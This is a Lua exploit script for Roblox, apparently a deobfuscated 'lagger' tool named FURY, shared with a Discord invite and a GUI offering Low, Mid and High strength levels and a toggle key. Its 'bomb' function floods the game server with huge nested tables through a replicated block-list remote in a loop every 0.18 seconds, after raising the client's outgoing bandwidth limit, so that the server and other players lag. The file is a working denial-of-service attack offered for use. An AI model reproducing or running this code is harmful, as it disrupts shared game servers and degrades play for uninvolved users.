--[[
========================================

════════════════════════════════════════════
║          Fury ║ EnvSight                ║
╚═══════════════════════════════════════════
Script Deobfuscated by Cypher Spectre
Version: EnvSight
Author on Discord / TikTok:
@roman666cabj
https://discord.gg/b8QsvrMCNq

========================================
]]

--// FURY - PAINEL COM LAG (fundo preto, sem chuva)
--// Nome alterado, fundo preto, textos em PT-BR no lado direito

--// SERVICES
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local ConfigFile = "KillHubConfig.json"

-- ⚙️ PODER EXACTO: 25 - 32 - 70
local NIVELES = {
    Low     = { poder = 25 },
    Mid     = { poder = 32 },
    High    = { poder = 70 }
}

local keybind = Enum.KeyCode.M          -- Tecla por defecto
local listeningForInput = false
local laggerActive = false
local lagThread = nil
local nivelActual = "Low"
local ventanaBloqueada = false

-- 🎨 ESTILO TERROR (modificado para fundo preto)
local UI_CONFIG = {
    MainBg       = Color3.fromRGB(0, 0, 0),       -- fundo preto
    TitleColor   = Color3.fromRGB(255, 255, 255), -- título branco
    TextColor    = Color3.fromRGB(255, 255, 255),
    ButtonInact  = Color3.fromRGB(50, 50, 50),
    ButtonAct    = Color3.fromRGB(0, 0, 0),
    ToggleOff    = Color3.fromRGB(80, 80, 80),
    ToggleOn     = Color3.fromRGB(0, 0, 0),
    LockColor    = Color3.fromRGB(200, 200, 200),
    UnlockColor  = Color3.fromRGB(100, 100, 100),
    Font         = Enum.Font.GothamBold,
    BorderColor  = Color3.fromRGB(60, 60, 60),
    GlowColor    = Color3.fromRGB(200, 0, 0),
    SelectorBg   = Color3.fromRGB(60, 60, 60),
    SelectorAct  = Color3.fromRGB(0, 0, 0),
}

-- 💾 CONFIG
local function SaveConfig()
    local data = {
        Keybind = keybind.Name,
        Nivel = nivelActual,
        Bloqueado = ventanaBloqueada
    }
    pcall(function() writefile(ConfigFile, HttpService:JSONEncode(data)) end)
end

local function LoadConfig()
    if pcall(isfile, ConfigFile) and isfile(ConfigFile) then
        pcall(function()
            local data = HttpService:JSONDecode(readfile(ConfigFile))
            keybind = Enum.KeyCode[data.Keybind] or Enum.KeyCode.M
            nivelActual = data.Nivel or "Low"
            ventanaBloqueada = data.Bloqueado or false
        end)
    end
end
LoadConfig()

-- ⚡ LAG ENGINE
local function bomb(poder)
    local main, spam = {}, {{}}
    local z = spam[1]
    for i = 1, 25 do local t = {} table.insert(z, t) z = t end
    local max = math.min(12000, poder * 50)
    for i = 1, max do table.insert(main, spam) end
    pcall(function() game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(main) end)
end

-- 🧩 ELEMENTOS
local toggleBall, toggleContainer, btnLow, btnMid, btnHigh, lockButton
local titleLabel, textEnable, keybindButton, textLagger, toggleClick

-- Funções de atualização
local function actualizarBotonesNivel()
    if nivelActual == "Low" then
        btnLow.BackgroundColor3 = UI_CONFIG.ButtonAct
        btnLow.TextColor3 = Color3.fromRGB(255,255,255)
        btnLow.BorderSizePixel = 0
    else
        btnLow.BackgroundColor3 = UI_CONFIG.ButtonInact
        btnLow.TextColor3 = Color3.fromRGB(255,255,255)
        btnLow.BorderSizePixel = 1
        btnLow.BorderColor3 = UI_CONFIG.BorderColor
    end
    if nivelActual == "Mid" then
        btnMid.BackgroundColor3 = UI_CONFIG.ButtonAct
        btnMid.TextColor3 = Color3.fromRGB(255,255,255)
        btnMid.BorderSizePixel = 0
    else
        btnMid.BackgroundColor3 = UI_CONFIG.ButtonInact
        btnMid.TextColor3 = Color3.fromRGB(255,255,255)
        btnMid.BorderSizePixel = 1
        btnMid.BorderColor3 = UI_CONFIG.BorderColor
    end
    if nivelActual == "High" then
        btnHigh.BackgroundColor3 = UI_CONFIG.ButtonAct
        btnHigh.TextColor3 = Color3.fromRGB(255,255,255)
        btnHigh.BorderSizePixel = 0
    else
        btnHigh.BackgroundColor3 = UI_CONFIG.ButtonInact
        btnHigh.TextColor3 = Color3.fromRGB(255,255,255)
        btnHigh.BorderSizePixel = 1
        btnHigh.BorderColor3 = UI_CONFIG.BorderColor
    end
end

local function actualizarSwitch()
    if toggleContainer then
        toggleContainer.BackgroundColor3 = laggerActive and UI_CONFIG.ToggleOn or UI_CONFIG.ToggleOff
    end
    if toggleBall then
        toggleBall.BackgroundColor3 = laggerActive and UI_CONFIG.ToggleOn or UI_CONFIG.ToggleOff
        if laggerActive then
            toggleBall.Position = UDim2.new(1, -18, 0.5, -9)
        else
            toggleBall.Position = UDim2.new(0, 3, 0.5, -9)
        end
    end
    if toggleClick then
        toggleClick.Text = laggerActive and "Ligado" or "Desligado"
        if laggerActive then
            toggleClick.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            toggleClick.TextColor3 = Color3.fromRGB(255, 255, 255)
        else
            toggleClick.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
            toggleClick.TextColor3 = Color3.fromRGB(200, 200, 200)
        end
    end
end

local function actualizarCandado()
    lockButton.Text = ventanaBloqueada and "Destravar" or "Travar"
    lockButton.TextColor3 = ventanaBloqueada and UI_CONFIG.LockColor or UI_CONFIG.UnlockColor
end

local function actualizarKeybindButton()
    if keybindButton then
        local display = keybind.Name
        if display:match("Button") then
            display = display:gsub("Button", "")
        end
        keybindButton.Text = display
    end
end

local function toggleLagger()
    laggerActive = not laggerActive
    local targetPos = laggerActive and UDim2.new(1, -18, 0.5, -9) or UDim2.new(0, 3, 0.5, -9)
    local targetColor = laggerActive and UI_CONFIG.ToggleOn or UI_CONFIG.ToggleOff
    TweenService:Create(toggleBall, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        Position = targetPos,
        BackgroundColor3 = targetColor
    }):Play()
    TweenService:Create(toggleContainer, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        BackgroundColor3 = targetColor
    }):Play()

    toggleClick.Text = laggerActive and "Ligado" or "Desligado"
    if laggerActive then
        toggleClick.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        toggleClick.TextColor3 = Color3.fromRGB(255, 255, 255)
    else
        toggleClick.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
        toggleClick.TextColor3 = Color3.fromRGB(200, 200, 200)
    end

    if laggerActive then
        if lagThread then task.cancel(lagThread) end
        lagThread = task.spawn(function()
            while laggerActive do
                pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(80000) end)
                bomb(NIVELES[nivelActual].poder)
                task.wait(0.18)
            end
        end)
    else
        if lagThread then task.cancel(lagThread); lagThread = nil end
    end
end

-- 🖥️ INTERFACE
if CoreGui:FindFirstChild("KillHub_UI") then CoreGui.KillHub_UI:Destroy() end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "KillHub_UI"
screenGui.Parent = CoreGui
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.ResetOnSpawn = false

-- Painel: 200 x 100
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.BackgroundColor3 = UI_CONFIG.MainBg
mainFrame.BorderSizePixel = 2
mainFrame.BorderColor3 = UI_CONFIG.GlowColor
mainFrame.Size = UDim2.new(0, 200, 0, 100)
mainFrame.Position = UDim2.new(0.15, 0, 0.5, -50)
mainFrame.Parent = screenGui
mainFrame.ClipsDescendants = true
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 8)

-- ❌ CHUVA REMOVIDA (fundo totalmente preto)
-- Apenas um frame transparente para manter estrutura, mas invisível
local rainCanvas = Instance.new("Frame")
rainCanvas.Name = "RainCanvas"
rainCanvas.BackgroundTransparency = 1
rainCanvas.Size = UDim2.new(1, 0, 1, 0)
rainCanvas.Parent = mainFrame
rainCanvas.ZIndex = 0
rainCanvas.Visible = false  -- oculta completamente

-- TÍTULO "FURY"
titleLabel = Instance.new("TextLabel", mainFrame)
titleLabel.BackgroundTransparency = 1
titleLabel.Position = UDim2.new(0, 10, 0, 0)
titleLabel.Size = UDim2.new(1, -45, 0, 28)
titleLabel.Font = Enum.Font.GothamBlack
titleLabel.Text = "FURY"                     -- Nome alterado
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.TextSize = 18
titleLabel.TextXAlignment = Enum.TextXAlignment.Left
titleLabel.TextYAlignment = Enum.TextYAlignment.Center
titleLabel.ZIndex = 1
titleLabel.ClipsDescendants = false

-- Animação do título (agora mais sutil, apenas brilho)
task.spawn(function()
    while true do
        TweenService:Create(titleLabel, TweenInfo.new(0.2), {
            TextSize = 20,
            TextColor3 = Color3.fromRGB(200, 200, 200)
        }):Play()
        task.wait(0.3)
        TweenService:Create(titleLabel, TweenInfo.new(0.2), {
            TextSize = 18,
            TextColor3 = Color3.fromRGB(255, 255, 255)
        }):Play()
        task.wait(0.3)
        if math.random() < 0.15 then
            TweenService:Create(titleLabel, TweenInfo.new(0.1), {
                TextSize = 22,
                TextColor3 = UI_CONFIG.GlowColor
            }):Play()
            task.wait(0.15)
            TweenService:Create(titleLabel, TweenInfo.new(0.1), {
                TextSize = 18,
                TextColor3 = Color3.fromRGB(255, 255, 255)
            }):Play()
            task.wait(0.15)
        end
    end
end)

-- Candado (texto em PT-BR)
lockButton = Instance.new("TextButton", mainFrame)
lockButton.BackgroundTransparency = 1
lockButton.Position = UDim2.new(1, -50, 0, 3)
lockButton.Size = UDim2.new(0, 45, 0, 18)
lockButton.Font = UI_CONFIG.Font
lockButton.TextSize = 10
lockButton.TextColor3 = UI_CONFIG.TextColor
lockButton.AutoButtonColor = false
lockButton.ZIndex = 1
lockButton.MouseButton1Click:Connect(function()
    ventanaBloqueada = not ventanaBloqueada
    actualizarCandado()
    SaveConfig()
end)
actualizarCandado()

-- FILA "ENABLE LAGGER" (mantido em inglês, mas pode ser alterado se quiser)
textEnable = Instance.new("TextLabel", mainFrame)
textEnable.BackgroundTransparency = 1
textEnable.Position = UDim2.new(0, 10, 0, 30)
textEnable.Size = UDim2.new(0, 40, 0, 16)
textEnable.Font = UI_CONFIG.Font
textEnable.Text = "ENABLE"
textEnable.TextColor3 = UI_CONFIG.TextColor
textEnable.TextSize = 10
textEnable.TextXAlignment = Enum.TextXAlignment.Left
textEnable.ZIndex = 1

textLagger = Instance.new("TextLabel", mainFrame)
textLagger.BackgroundTransparency = 1
textLagger.Position = UDim2.new(0, 52, 0, 30)
textLagger.Size = UDim2.new(0, 45, 0, 16)
textLagger.Font = UI_CONFIG.Font
textLagger.Text = "LAGGER"
textLagger.TextColor3 = UI_CONFIG.TextColor
textLagger.TextSize = 10
textLagger.TextXAlignment = Enum.TextXAlignment.Left
textLagger.ZIndex = 1

-- Botão de tecla (mantido, mas ajustado visualmente)
keybindButton = Instance.new("TextButton", mainFrame)
keybindButton.BackgroundColor3 = UI_CONFIG.SelectorBg
keybindButton.Position = UDim2.new(0, 100, 0, 30)
keybindButton.Size = UDim2.new(0, 24, 0, 16)
keybindButton.Font = UI_CONFIG.Font
keybindButton.Text = "M"
keybindButton.TextColor3 = Color3.fromRGB(200,200,200)
keybindButton.TextSize = 9
keybindButton.AutoButtonColor = false
keybindButton.ZIndex = 1
Instance.new("UICorner", keybindButton).CornerRadius = UDim.new(0, 3)
actualizarKeybindButton()

-- SWITCH
toggleContainer = Instance.new("Frame", mainFrame)
toggleContainer.BackgroundColor3 = UI_CONFIG.ToggleOff
toggleContainer.Position = UDim2.new(1, -50, 0, 30)
toggleContainer.Size = UDim2.new(0, 42, 0, 20)
toggleContainer.ZIndex = 1
Instance.new("UICorner", toggleContainer).CornerRadius = UDim.new(1,0)

toggleBall = Instance.new("Frame", toggleContainer)
toggleBall.BackgroundColor3 = UI_CONFIG.ToggleOff
toggleBall.Size = UDim2.new(0, 18, 0, 18)
toggleBall.Position = UDim2.new(0, 2, 0.5, -9)
toggleBall.ZIndex = 1
Instance.new("UICorner", toggleBall).CornerRadius = UDim.new(1,0)

toggleClick = Instance.new("TextButton", toggleContainer)
toggleClick.BackgroundTransparency = 0
toggleClick.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
toggleClick.Size = UDim2.new(1,0,1,0)
toggleClick.ZIndex = 2
toggleClick.Font = UI_CONFIG.Font
toggleClick.Text = "Desligado"
toggleClick.TextSize = 9
toggleClick.TextColor3 = Color3.fromRGB(200,200,200)
toggleClick.TextXAlignment = Enum.TextXAlignment.Center
toggleClick.TextYAlignment = Enum.TextYAlignment.Center
toggleClick.MouseButton1Click:Connect(toggleLagger)
toggleClick.AutoButtonColor = false
local corner = Instance.new("UICorner", toggleClick)
corner.CornerRadius = UDim.new(1,0)

-- SELECTOR DE TECLA
keybindButton.MouseButton1Click:Connect(function()
    if listeningForInput then return end
    listeningForInput = true
    keybindButton.Text = "..."
    keybindButton.BackgroundColor3 = UI_CONFIG.GlowColor
    keybindButton.TextColor3 = Color3.fromRGB(255,255,255)
end)

local inputConnection
inputConnection = UserInputService.InputBegan:Connect(function(input, gp)
    if not listeningForInput then return end
    if gp then return end

    local newKey = nil
    if input.KeyCode ~= Enum.KeyCode.Unknown then
        newKey = input.KeyCode
    elseif input.UserInputType == Enum.UserInputType.Gamepad1 and input.KeyCode ~= Enum.KeyCode.Unknown then
        newKey = input.KeyCode
    end

    if newKey then
        keybind = newKey
        actualizarKeybindButton()
        SaveConfig()
        listeningForInput = false
        keybindButton.BackgroundColor3 = UI_CONFIG.SelectorBg
        keybindButton.TextColor3 = Color3.fromRGB(200,200,200)
    end
end)

-- Botões LOW/MID/HIGH
local btnY = 62
local btnW = 60
local btnH = 24
local espaciado = 5
local margenIzq = 5

local function aplicarEfectoHover(btn)
    btn.MouseEnter:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.2), {
            BackgroundColor3 = UI_CONFIG.GlowColor,
            TextColor3 = Color3.fromRGB(255,255,255)
        }):Play()
    end)
    btn.MouseLeave:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.2), {
            BackgroundColor3 = btn.BackgroundColor3,
            TextColor3 = btn.TextColor3
        }):Play()
    end)
end

btnLow = Instance.new("TextButton", mainFrame)
btnLow.Size = UDim2.new(0, btnW, 0, btnH)
btnLow.Position = UDim2.new(0, margenIzq, 0, btnY)
btnLow.Font = UI_CONFIG.Font
btnLow.Text = "LOW"
btnLow.TextColor3 = Color3.fromRGB(255,255,255)
btnLow.TextSize = 10
btnLow.AutoButtonColor = false
btnLow.BackgroundColor3 = UI_CONFIG.ButtonInact
btnLow.BorderSizePixel = 1
btnLow.BorderColor3 = UI_CONFIG.BorderColor
btnLow.ZIndex = 1
Instance.new("UICorner", btnLow).CornerRadius = UDim.new(0, 5)
btnLow.MouseButton1Click:Connect(function()
    nivelActual = "Low"
    actualizarBotonesNivel()
    SaveConfig()
end)
aplicarEfectoHover(btnLow)

btnMid = Instance.new("TextButton", mainFrame)
btnMid.Size = UDim2.new(0, btnW, 0, btnH)
btnMid.Position = UDim2.new(0, margenIzq + btnW + espaciado, 0, btnY)
btnMid.Font = UI_CONFIG.Font
btnMid.Text = "MID"
btnMid.TextColor3 = Color3.fromRGB(255,255,255)
btnMid.TextSize = 10
btnMid.AutoButtonColor = false
btnMid.BackgroundColor3 = UI_CONFIG.ButtonInact
btnMid.BorderSizePixel = 1
btnMid.BorderColor3 = UI_CONFIG.BorderColor
btnMid.ZIndex = 1
Instance.new("UICorner", btnMid).CornerRadius = UDim.new(0, 5)
btnMid.MouseButton1Click:Connect(function()
    nivelActual = "Mid"
    actualizarBotonesNivel()
    SaveConfig()
end)
aplicarEfectoHover(btnMid)

btnHigh = Instance.new("TextButton", mainFrame)
btnHigh.Size = UDim2.new(0, btnW, 0, btnH)
btnHigh.Position = UDim2.new(0, margenIzq + (btnW + espaciado) * 2, 0, btnY)
btnHigh.Font = UI_CONFIG.Font
btnHigh.Text = "HIGH"
btnHigh.TextColor3 = Color3.fromRGB(255,255,255)
btnHigh.TextSize = 10
btnHigh.AutoButtonColor = false
btnHigh.BackgroundColor3 = UI_CONFIG.ButtonInact
btnHigh.BorderSizePixel = 1
btnHigh.BorderColor3 = UI_CONFIG.BorderColor
btnHigh.ZIndex = 1
Instance.new("UICorner", btnHigh).CornerRadius = UDim.new(0, 5)
btnHigh.MouseButton1Click:Connect(function()
    nivelActual = "High"
    actualizarBotonesNivel()
    SaveConfig()
end)
aplicarEfectoHover(btnHigh)

actualizarBotonesNivel()
actualizarSwitch()

-- ARRASTRAR
local isDragging, dragStart, startPos = false, nil, nil
mainFrame.InputBegan:Connect(function(input)
    if ventanaBloqueada then return end
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isDragging = true
        dragStart = input.Position
        startPos = mainFrame.Position
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if not isDragging or ventanaBloqueada then return end
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        local delta = input.Position - dragStart
        mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)
mainFrame.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isDragging = false
    end
end)

-- 🎮 ATIVAÇÃO COM A TECLA ESCOLHIDA
UserInputService.InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == keybind or (input.UserInputType == Enum.UserInputType.Gamepad1 and input.KeyCode == keybind) then
        toggleLagger()
    end
end)
